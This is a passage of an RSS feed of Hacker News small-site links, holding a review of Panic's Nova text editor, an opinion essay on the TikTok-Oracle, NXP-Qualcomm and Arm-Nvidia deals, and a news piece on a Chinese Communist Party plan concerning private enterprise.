href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.barebones.com%2Fproducts%2Fbbedit%2Findex.html&amp;t=MjMxNDVhZDZmMzZkYzhmMTQyODgwZTQ1MDA1ODU2MzQxNGYzYjE1ZSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">BBEdit</a>. When it comes to editing <em>code,</em> though, BBEdit lags behind. My suspicion is that BBEdit’s lack of an integrated package manager has hurt it here. Also, BBEdit’s language modules don’t support extending one another, making it effectively impossible to do full highlighting for a templating language like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Freactjs.org%2Fdocs%2Fintroducing-jsx.html&amp;t=ZTIzOWJiYzJmNjI5ZDI1OTQxNzE1N2Y4MGRjZWQyZjE4NWJhZDk5MSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">JSX</a> or <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpalletsprojects.com%2Fp%2Fjinja%2F&amp;t=MjdhNWI5ZjdiMzVjMGEwNTQ2NjkxYzZmNGYxNmVkMDUwODY0MjNhNCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Jinja</a>.</p><p>When I was a web programmer, I was one of many who moved to <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmacromates.com%2F&amp;t=OTQwOWM1MTVhYTM2MmE5YjMzOWNmM2RlM2YxODcwOTBhZTI2ZGQxNSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">TextMate</a>, and used it for everything for a while. When the Godot-like wait for TextMate 2.0 became unbearable, I wandered the text editing wilderness, eventually splitting my loyalties between BBEdit, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sublimetext.com%2F&amp;t=ZjhjZDM2Mjg2ZmU4OTRlZjQ2ODYwYjkyZjlmYjY1Y2U5NDFlMzhhMixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Sublime Text</a>, and more recently VS Code. At this point, I suspect nothing will pull me away from BBEdit for technical writing, but for programming I’m open to persuasion.</p><h2 id="so-meet-nova">So: meet Nova.</h2><figure data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"><img src="https://64.media.tumblr.com/71bc06b690da9776b15d551318a514f0/d722421a61f4e9d6-93/s1280x1920/fb42d548cc1d17dee9a5c099241dfa4bbf6e83e0.png" alt="A screenshot of Nova's main window, showing its sidebar and a Ruby file." title="nova-main-window-2x.png" width="1096" height="1048" data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"></figure><p>I’ve been using Nova off and on in beta for months. I’ve reported some bugs, although I may mention a couple here that I didn’t catch until after 1.0’s release. And, I’m going to compare it to the GUI editors that I’ve been using recently: BBEdit, Sublime Text, and VS Code.</p><p>Nova is a <em>pretty</em> editor, as far as such things go, and with files of relatively reasonable size it’s fast. With stupid huge files its performance drops noticeably, though. This isn’t just the ridiculous 109MB, nearly 450,000-line SQL file I threw at it once, it’s also with a merely 2MB, 50,000-line SQL file, and Nova’s offer to turn off syntax highlighting in both files didn’t help it much. This may sound like a silly test, but in my day job I’m occasionally stuck editing an 80,000-line JSON file by hand (don’t ask). This is something BBEdit and VS Code can do without complaint. Panic wrote their own text editing engine for Nova, which is brave, but it needs more tuning for pathological cases like these. They may not come up often, but almost every programmer has <em>one</em> stupid huge file to deal with.</p><p>Nova has an integrated terminal <em>and</em> an integrated SSH client, and even an integrated file transfer system based on Panic’s <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.panic.com%2Ftransmit%2F&amp;t=YjE1ZmMyY2VhNmU0ZTBhMjdkY2QzOThlNWI4MzdiNzM4YmMxNTAwYyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Transmit</a>. In fact, if you have Transmit and use <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com%2Fsync%2F&amp;t=NTY5ZDBkMDZlYTZkZjk0ODZhNzAzZGIxM2M2NmY3OWVkYzRiZGJjMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Panic Sync</a>, it knows all of those servers out of the box. Nova has a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Frun-tasks%2F&amp;t=OTRjOTZhOGM1ZTExZmUzMmFmYWM3ODk4YTYyOGZhZTU5OThiMzMzYyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">task workflow system</a> for automating building and running. You can associated servers, tasks, and more with individual projects; Nova’s project settings are considerably more comprehensive than I’ve seen in other editors. You can even set up <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Fremote-tasks%2F&amp;t=NjY2MDk4ODZlZGRiZTMwODljNWZkMDE4YjlkM2FkM2Y5NjBiMGVmYSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">remote tasks</a>. Nova has a serviceable Git client built in, too. Like VS Code, Nova uses JavaScript for its extension API, and it has built-in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmicrosoft.github.io%2Flanguage-server-protocol%2F&amp;t=NDljNmJiYWUzZWI3N2RjYjAxMzg5MzJjNmJiNmE1ODdkNDY3MTQ5NixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Language Server Protocol</a> support—it’s a superbly solid foundation.</p><p>Beyond that, some smaller features have become table stakes for modern GUI editors, and Nova handles them with aplomb. “Open Quickly” can jump to any file in the open project, as well as search by symbols or just symbols in currently open files; it has a command palette; you can comprehensively edit keybindings. It has multiple cursor support for those of us who like that, and a “mini map” view for those of you who like that, although know that you are wrong. Nova’s selection features include “Select all in scope” and “Select all between brackets,” a command I often use in BBEdit and miss dearly in Code. (Both Nova and BBEdit select between brackets and braces, although BBEdit also selects between parentheses.) This effectively becomes “Select between tags” in HTML, a nice touch. There are a few other commands like “Select all in function” and “Select all in scope” that I didn’t have any luck in making work at all; a little more documentation would be nice.</p><p>That’s worth an aside. Panic has created a “library” of tech note-style articles about Nova sorted by publication date rather than an actual manual, and it’s not always easy to find the information you want in it. I know this is just what a technical writer would say, but I’d dearly like to see a human-organized table of contents starting with the editor basics and moving to advanced topics like version control, server publishing and extension authoring.</p><h3 id="the-zen-of-language-servers">The Zen of Language Servers</h3><p>A lot of Visual Studio Code’s smarts depend on the implementation of a “language server” behind the scenes: language servers offer almost spookily intelligent completion. For instance, take this PHP snippet:</p><pre><code>if ($allowed) {
    $response = new Response(405);
    $response-&gt;
</code></pre><p>If you have the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fbmewburn%2Fvscode-intelephense&amp;t=OTYwZGZlODA2YmZkNzlmMTcxMDliYTYzMWNkMTEzODViZDUyMDFkMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Intelephense</a> PHP language server plugin, Code understands that <code>$response</code> is an instance of <code>Response</code> and, after you type the <code>&gt;</code> above, offers completions of method names from the <code>Response</code> class.</p><p>Right now, Nova’s mostly limited to the language servers Panic provides, and they’re… not always so smart. In that snippet above, Nova starts by offering completions of, apparently, <em>everything</em> in the open project, starting with the variables. If I type “s,” it narrows things down to methods that begin with “s,” but it’s <em>all</em> methods that start with “s” rather than just the methods from <code>Response</code>. The “Jump to Definition” command shows a similar lack of context; if I highlight a method name that’s defined in multiple places, Nova shows me a popup menu and prompts me to choose which one to jump to, rather than introspecting the code to make that decision itself.</p><p>But, this is a solvable problem: there’s (I think) no reason someone couldn’t write an Inteliphense plugin for Nova. If Nova’s ecosystem takes off, it could be pretty formidable pretty quickly.</p><h2 id="walk-like-a-mac">Walk like a Mac</h2><p>Even so, LSP support isn’t Panic’s biggest selling point. Unlike Sublime Text or VS Code, Nova isn’t cross-platform: it’s a Mac-only program written to core platform APIs. Is that still a huge draw in 2020? (Is it instead a drawback?)</p><p>You can definitely see a difference between Nova and BBEdit on one side and Sublime and Code on the other in terms of resource usage. With the two Ruby files shown in the screenshot above loaded, I get:</p><ul><li>VS Code: 355 MB, 6 processes</li><li>Sublime Text: 338 MB, 2 processes</li><li>Nova: 101 MB, 2 processes</li><li>BBEdit: 97 MB, 1 process</li></ul><p>Code is an Electron-based program, although Microsoft famously puts a lot of effort into making it not feel like the black hole a lot of Electron-based apps are. Sublime uses its own proprietary cross-platform framework. In fairness, while us nerds like to harp on research usage a lot, if your computer’s got 16G or more of RAM in it, this probably isn’t a big deal.</p><p>You notice Nova’s essential Mac-ness in other ways. Its preference pane is, like BBEdit’s, an actual preference pane, instead of opening in another tab like Code or just opening a JSON file in a new tab (!) like Sublime. And while all editors better have first-class keyboard support—and Nova does—a good Mac editor should have first-class <em>mouse</em> support, too, and it does. You notice that in the drag-and-drop support for creating new tabs and splits. Nova’s sidebar is also highly customizable, possibly more so than any editor I’ve regularly used. (Yes, Emacs fans, I know you can write all of Nova in Lisp if you want. When one of you does that, please get back to me.)</p><p>Unlike BBEdit, though, Nova doesn’t have a Mac-like title bar, or a Mac-like outline view of the project files, or Mac-like tabs. (Well, BBEdit doesn’t have tabs at all, which turns out to be a great UI decision once you have a dozen or more files open, but never mind.) This isn’t necessarily bad; people often say BBEdit “looks old,” and it’s hard not to suspect that what people mean by that—whether or not they know it—is that it looks like the long-established Mac program it is. Nova is relying less on “we have a Mac UI and the other guys don’t” than on “we have Panic’s designers and the other guys don’t.” Make no mistake, having Panic’s designers counts for a lot.</p><p>What may be more disappointing to old school Mac nerds is AppleScript support: none whatsoever. It doesn’t even have a vestigial script dictionary. Again, this may not be something most people care much about; personally, I <em>hate</em> having to write AppleScript. But I love being <em>able</em> to write AppleScript. BBEdit’s extensive scriptability is one of its hidden strengths. Nova’s Node-based JavaScript engine is probably more powerful for its own extensions and certainly more accessible to anyone under the age of 50, but it may be hard to call it from external programs.</p><h2 id="so-is-it-worth-it">So is it worth it?</h2><p>That probably depends on where you’re coming from.</p><p>If you loved—or still use—Panic’s older editor, Coda, this is a no-brainer upgrade. If you used <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.espressoapp.com&amp;t=MTE5OTJlODE3YjcwNDU0ZGNjMDFiOTIxMGE5MWVmMjkwYTMwYTQ3NSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600705575">Espresso</a>, a Coda-ish editor that always seemed to be on the verge of greatness without ever reaching it, Nova may also be a no-brainer for you.</p><p>If you’re a fan of Sublime Text, BBEdit, TextMate, or another editor that doesn’t have native Language Server Protocol support, you should definitely <em>try</em> Nova. Sublime and TextMate have more plugins (especially Sublime), but many extensions seem to be languishing (especially TextMate). BBEdit never had a great extension ecosystem to start with. All of these editors have strengths Nova doesn’t, but the reverse is also true, and Nova may catch up.</p><p>If you’re an Emacs or Vim power user, we both know you’re just reading this out of academic interest and you’re not going to switch. C’mon.</p><p>If you use Visual Studio Code, though, it’s way tougher to make the case for Nova. Code has a <em>vastly</em> larger extension library. It has the best support for LSP of any editor out there (LSP was developed <em>for</em> Code). Despite being …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</a></em></p>]]>
            </description>
            <link>https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511824</guid>
            <pubDate>Fri, 18 Sep 2020 00:54:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Era of Regulatory Grift: TikTok-Oracle, NXP-Qualcomm, Arm-Nvidia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511748">thread link</a>) | @ceohockey60
<br/>
September 17, 2020 | https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/ | <a href="https://web.archive.org/web/*/https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="english-version">
                        <p>The dictionary definition of the word “grift” is as follows: “<a href="https://www.merriam-webster.com/dictionary/grift">to acquire money or property illicitly</a>”. It may be a strong word, but also more or less encapsulates the regulatory ethos that’s governing cross-border technology businesses these days.</p><p>The TikTok-Oracle deal flaunts this grifting ethos, but it’s just the latest example of a series of haphazard regulatory actions mired in geopolitical brinkmanship -- a trend that may implicate deals with much larger impact, like the pending Nvidia acquisition of Arm.</p><h2 id="tiktok-oracle">TikTok-Oracle</h2><p>There are still many missing details to the TikTok-Oracle deal, and Trump <a href="https://uk.reuters.com/article/us-usa-tiktok-oracle/trump-raises-questions-about-tiktok-oracle-deal-if-bytedance-ties-remain-idUKKBN2672KD">may not approve the deal</a>. But in the grand scheme of things, many of these details are no longer important, because the spirit of the entire TikTok “soap opera” is cemented: a <strong>regulatory grift </strong>by the Trump administration that enriches its political donor (Larry Ellison), strengthens its campaign message (anti-China, job creation), while doing next to nothing to protect Americans from either intrusive data collection or foreign influence.</p><p>Let’s look at each of these malfeasances.</p><p><strong><em>What Oracle gets.</em></strong> TikTok’s immediate business value accrues to Oracle Cloud to the tune of possibly <a href="https://www.theinformation.com/articles/with-tiktok-deal-oracle-could-gain-billion-dollar-cloud-customer?utm_content=article-4850&amp;utm_campaign=article_email&amp;utm_source=sg&amp;utm_medium=email">$1 billion in annual revenue</a> in the coming years, as it desperately tries to catch up to AWS and Azure. The Oracle brand may also get a boost from this young, cool consumer product, even though Oracle has no experience running such a product. Since I’ve written in detail about TikTok’s business value in “<a href="https://interconnected.blog/what-is-tiktok-worth-to-whom-and-why/"><strong>What is TikTok Worth to Whom and Why?</strong></a>”, I won’t repeat myself here. <strong>One element I did not discuss so explicitly is how valuable TikTok’s user data is to the Oracle data broker business.</strong></p><p>In a nutshell, a data broker sells data to third parties mostly for marketing or advertisement purposes. Oracle’s data broker businesses are euphemistically called <a href="https://www.oracle.com/cx/marketing/">Oracle CX Marketing</a> and <a href="https://www.oracle.com/data-cloud/">Oracle Data Cloud</a>. Having the treasure trove of data that TikTok has already collected is perhaps an even more immediate business boost to Oracle than getting the product’s workload onto its cloud. Ironically (or perhaps appropriately), the person who called out the privacy violations of data brokers like Oracle, Equifax, and others is <a href="https://www.linkedin.com/in/michael-beckerman-9b750a58/"><strong>Michael Berkerman</strong></a><strong>, who is currently TikTok US’s Head of Public Policy</strong>. He did so last year as the then President and CEO of the Internet Association in <a href="https://www.foxnews.com/opinion/michael-beckerman-why-do-we-need-a-federal-privacy-law-ask-the-data-brokers-selling-your-private-information">an OpEd published on Fox News</a> -- a “media” outlet that the President of the United States most certainly pays attention to. I wonder how long Berkerman will be sticking around, if at all, after the TikTok-Oracle deal closes.</p><p>Lastly, Oracle will likely get a <a href="https://www.ft.com/content/58eb7c26-2154-477f-af19-19157ae29261">minority stake in TikTok</a> with ByteDance still being the majority shareholder. This piece of equity in one of the most valuable private tech companies in the world -- trading at a $140 billion valuation in the secondary market earlier this year -- is something that Oracle would have no business getting in a normal investing situation. Not a bad deal <a href="https://www.businessinsider.com/oracle-billionaire-larry-ellison-is-fundraising-for-donald-trump-2020-2">for hosting a single fundraiser</a>.</p><p><strong><em>What the Trump campaign gets.</em> </strong>Being more “anti-China” than Biden and going after the Vice President’s son’s business dealings in China has been a messaging tentpole of the Trump re-election campaign. It can now claim credit for acting tough and forcing a marquee Chinese tech company to “surrender” its crown jewel product to America, while accomplishing none of those things, because TikTok’s core technology is staying with ByteDance in China.</p><p>The Oracle bid also apparently includes a “<strong>20,000 new jobs” </strong>commitment -- a typical public relations promise with no legally binding effect. Being “anti”-China while “creating” jobs is a strong one-two punch as we approach the final stretch of the 2020 election season, so much so that Secretary Mnuchin couldn't wait to sell the 20,000 jobs message on CNBC the day after Oracle’s winning bid was made public, <em>even though</em> the deal hasn’t been approved or finalized yet.</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/ZPRPswu2Cyc?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><p>TikTok US’s current payroll is about 1,400 people. <strong>That would be an almost 20x increase in headcount.</strong> Theoretically possible? Sure. Practical and sensible? Hardly.</p><p><em><strong>What the American people get.</strong> </em>Nothing, except that they still get to watch cool dance videos and <a href="https://www.tiktok.com/@rosssmith/video/6797540353730743557">grandmas do this</a> on their phones. We have no new information or answer to any of the three legitimate concerns surrounding TikTok:</p><ul><li>Does it send data to China?</li><li>Is its user data collection practices proper?</li><li>Is it being used as a tool for foreign influence?</li></ul><p>To be clear, there <em>are</em> regulatory tools based on technology at our disposal to answer these questions, <strong>with or without Oracle</strong>. I’ve laid them out in detail in “<a href="https://interconnected.blog/a-framework-to-dis-trust-and-verify-tiktok/"><strong>A Framework to (Dis)trust and Verify TikTok</strong></a>”. Unfortunately, it’s clear as day that the Trump administration is only interested in the political messaging benefits of TikTok-Oracle, not doing the actual work that is required to protect the interests of the American people.</p><p><strong>There is another winner that we should all take note of: <em>Chinese regulators.</em></strong></p><p>Chinese regulators typically use their power to force technology and IP transfers from foreign entities to domestic companies via joint-ventures or outright acquisitions -- <strong>another form of regulatory grift</strong>. This TikTok-Oracle deal is the first time to my knowledge, where Chinese regulators use their power to protect a home-grown technology from being <em>transferred out</em> to a foreign entity.</p><p>This win has just as much to do with exerting their regulatory power as the sucker on the other side of the negotiation table. This dynamic isn’t new, if we look at the failed NXP-Qualcomm acquisition in 2018.</p><h2 id="nxp-qualcomm">NXP-Qualcomm</h2><p>Qualcomm’s attempt to buy the Dutch semiconductor maker, NXP, for $44 billion was abandoned, because it could not get approval from Chinese regulators. This occurred during the previous height of tension when the U.S. and China were tossing retaliatory trade tariffs at each other like a couple of teenage boys in a backyard snowball fight.</p><p>The Chinese regulators did not disapprove of the deal and asked for changes to gain approval, which would’ve been a good faith move. <strong>They just ignored it and let the deadline pass.</strong> This is after Secretary Mnuchin and his Commerce Department counterpart, Wilbur Ross, lobbied the Chinese Vice Minister, Liu He, and Ambassador to the US, Cui Tiankai, to approve the deal. The backdrop of this lobbying was Trump easing the penalties on the Chinese telecom equipment maker, ZTE, for violating U.S. sanction rules with regard to Iran and North Korea -- hoping for some reciprocity and dealmaking.</p><p>This foolish hope did not pan out. Instead, Qualcomm, America’s national champion in the race to 5G, had to fork up a <a href="https://www.wsj.com/articles/qualcomm-plans-to-abandon-nxp-deal-1532549728">$2 billion cancellation fee to NXP and increase its stock buyback program from $10 to $30 billion</a> to appease its shareholders. What’s more, this turn of events showed Chinese regulators that given the <strong>interconnected nature of the global economy</strong>, particularly technology businesses, they have far-reaching authority and leverage to shape deals, events, and technology acquisition vis-a-vis <strong>a tough-talking, weak-acting </strong>Trump administration. It is a key reversal in fortune, when a large swath of China’s technology sector, particularly Huawei, has been hammered by U.S. sanctions.</p><p>Qualcomm-NXP was a defensive play -- not approving a deal. TikTok-Oracle is a proactive play -- not losing control of domestic technology. <strong>There’s now an opportunity for even more aggressive “regulatory grift”: Arm-Nvidia.</strong></p><h2 id="arm-nvidia">Arm-Nvidia</h2><p>It’s hard to comprehend the long-term impact that Nvidia’s $40 billion acquisition of Arm will have on the future of technology. One thing is certain though: it’s way more important than TikTok and Oracle, separately and combined.</p><p>We shouldn’t assume the Arm-Nvidia deal will be closed as expected given all the corporate governance issues with Arm’s China operation. Arm China’s CEO, Allen Wu, has been fired by the board for various acts of conflicts of interest and double dealing, <a href="https://www.zdnet.com/article/arms-fired-china-jv-head-refuses-to-leave-company-reps-banned-from-company-premises/">yet refuses to leave</a>. Arm’s CEO, Simon Segars, is trying to assure the public that the mess <a href="https://www.yicaiglobal.com/news/chip-designer-arm-to-solve-chinese-jv-management-issue-before-nvidia-buyout">will be cleaned up </a>in order to not endanger the sale, but he’s not in a position of leverage, now that the deal is public and the expectations are high. (Nvidia’s market cap increased by $17.5 billion the day after the deal was announced.)</p><p>Furthermore, the Arm China division is a joint-venture where 51% of the entity is owned by a consortium of these three funds:</p><ul><li><a href="https://en.wikipedia.org/wiki/China_Investment_Corporation">China Investment Corporation</a> (China’s sovereign wealth fund)</li><li><a href="https://en.wikipedia.org/wiki/Silk_Road_Fund">Silk Road Fund</a> (a state-owned fund focused on projects related to the Belt &amp; Road Initiative)</li><li><a href="https://en.wikipedia.org/wiki/Temasek_Holdings">Temasek Holding</a> (Singapore’s sovereign wealth fund)</li></ul><p>The other 49% is owned by Softbank via Arm. The joint venture structure is par for the course for any foreign technology company doing business in China. But such a tight ownership by state-owned funds means Chinese regulators (and Singaporean regulators for that matter) have strong jurisdictional power over the deal from the get-go. NXP-Qualcomm’s legal hook was a tenuous nexus. TikTok-Oracle’s hook was established by <a href="https://en.pingwest.com/a/7657">an eleventh hour change</a> to the government’s technology “entity list”. Arm-Nvidia doesn’t need any extra work for regulators to aggressively insert themselves into the picture.</p><p>What will the Chinese regulators do is hard to tell at this moment. However, given the fact that Arm’s chip design IP has a 95% global market share in mobile devices and is <a href="https://www.zdnet.com/article/aws-graviton2-what-it-means-for-arm-in-the-data-center-cloud-enterprise-aws/">making inroads into cloud data centers</a> as well, <strong>it’s likely that China will either veto the deal (like NXP-Qualcomm) or try to keep any semiconductor IP that Arm China has even a tangential connection to</strong>. Some Chinese tech media <a href="https://mp.weixin.qq.com/s/W8nhj6udDTdr54ui7_0RIQ">are already speculating about a veto</a>. Using this opportunity to acquire some key technology also makes sense, because by <em>not</em> doing so, China runs the monumental risk of having the entire Arm ecosystem be subject to U.S. sanctions after it becomes a property of Nvidia. An “<strong>Arm sanction</strong>” would cripple China’s entire mobile technology sector, where domestic chip design options barely exist and the open source option, RISC-V, still …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/">https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</a></em></p>]]>
            </description>
            <link>https://interconnected.blog/era-of-regulatory-grift-tiktok-oracle-nxp-qualcomm-arm-nvidia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511748</guid>
            <pubDate>Fri, 18 Sep 2020 00:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advanced Rest Client (ARC) – Free and open source API testing tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511697">thread link</a>) | @gilad
<br/>
September 17, 2020 | https://install.advancedrestclient.com/install | <a href="https://web.archive.org/web/*/https://install.advancedrestclient.com/install">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://install.advancedrestclient.com/install</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511697</guid>
            <pubDate>Fri, 18 Sep 2020 00:37:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CCP announces plan to take control of China's private sector]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24511672">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector | <a href="https://web.archive.org/web/*/https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        
        
      
        <h3>(ATF)Â&nbsp;Chinese President Xi Jinping and the Communist Party's Central Committee have laid out a plan for a â€˜new eraâ€™ in which the party has better control over private business in China. </h3><p><a href="http://www.xinhuanet.com/fortune/2020-09/15/c_1126497384.htm">The plan</a> was detailed in a 5,000-word statement â€“ and all regions and departments in the country have been told to follow the new guidelines.</p><p><span>This was the top story on Wednesday's CCTV Evening News â€“ how the president had issued â€œimportant instructionsâ€�.</span></p><p><span>It had a long-winded title: "Opinion on Strengthening the United Front Work of the Private Economy in the New Era".</span></p><p><span>The ultimate goal is for the party to have ideological leadership of private enterprise.</span></p><p><span>The statement seeks to improve CCP control over private enterprise and entrepreneurs through United Front Work â€œto better focus the wisdom and strengthen of the private businesspeople on the goal and mission to realise the great rejuvenation of the Chinese nation.â€�</span></p><p><span>Xi's instructions were issued ahead of a conference today on this very topic.Â&nbsp;</span>The party wants to see a "united front" between private enterprise and government business.</p><h3><figure><iframe frameborder="0" scrolling="no" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" mozallowfullscreen="" webkitallowfullscreen="" oallowfullscreen="" msallowfullscreen="" allowtransparency="true" src="//player.vimeo.com/video/459459469"></iframe></figure>100 ways to rein in the private sector</h3><p>Since the 18th National Congress in May, members of the party's Central Committee and Comrade Xi have proposed a series of new concepts and strategies, and adopted a series of major measures to guide and promote private economic 'united front' work. They say these moves have achieved "remarkable results". </p><p>As Chinaâ€™s private economy has grown and diversified, the statement says "these measures will bring about a great rejuvenation of the Chinese nation under Xi Jinping thought".</p><p>Overall, there are more than 100 measures, including guidance on selection of personnel to implement the measures. </p><p>"We must also see that socialism with Chinese characteristics has entered a new era, [as] the scale of the private economy has continued to expand, risks and challenges have increased significantly, the values and interests of the private economy have become increasingly diverse, and the united front work of the private economy is facing new situations and tasks," the statement says.</p><p>"In order to thoroughly implement the major decisions and deployments of the Party Central Committee, to further strengthen the Party's leadership of the private economic united front work, and to better integrate the wisdom and strength of private economic personnel to the goal and task of achieving the great rejuvenation of the Chinese nation, the following opinions are hereby offered."</p><p>The primary stated significance of the measures is â€œenhancement of the partyâ€™s leadership over the private economy â€“ private economic figures are to be more closely united around the party.â€�</p><h3>More CCP involvement in business</h3><p>This is quite a turnaround. Previously, private business was not considered very worthy for party membership or influence, but it has gradually entered the heart of the regime.</p><p>According to the new provisions, private firms will need a certain amount of CCP registered employees, which is already a long-term practise in large private firms but not smaller ones. </p><p>These cadres will make sure businesses follow the guiding ideologyÂ&nbsp;â€œGuided by Xi Jinpingâ€™s Thought on Socialism with Chinese Characteristics for a New Era.â€� </p><p>They will also guide private business people to enhance the latest CCP catchphrases â€“ â€œfour consciousnessesâ€�, strengthen the â€œfour self-confidencesâ€�, and achieve the â€œtwo safeguards.â€�</p><p>Duties of cadres will include the duties of strengthening ideological guidance,Â&nbsp;guiding private economic figures to increase their awareness of self-discipline, build a strong line of ideological and moral defence, strictly regulate their own words and deeds, cultivate a healthy lifestyle, and create a good public image.Â&nbsp;</p><p>They will also need to continuously improve law abidance and moral standards of private citizens.Â&nbsp;</p><p>Communication channels will be set up between private business and the party to report back on progress and other matters.</p>
      
      
        <p>Tags:</p>
      
      </article></div>]]>
            </description>
            <link>https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511672</guid>
            <pubDate>Fri, 18 Sep 2020 00:33:21 GMT</pubDate>
        </item>
    </channel>
</rss>
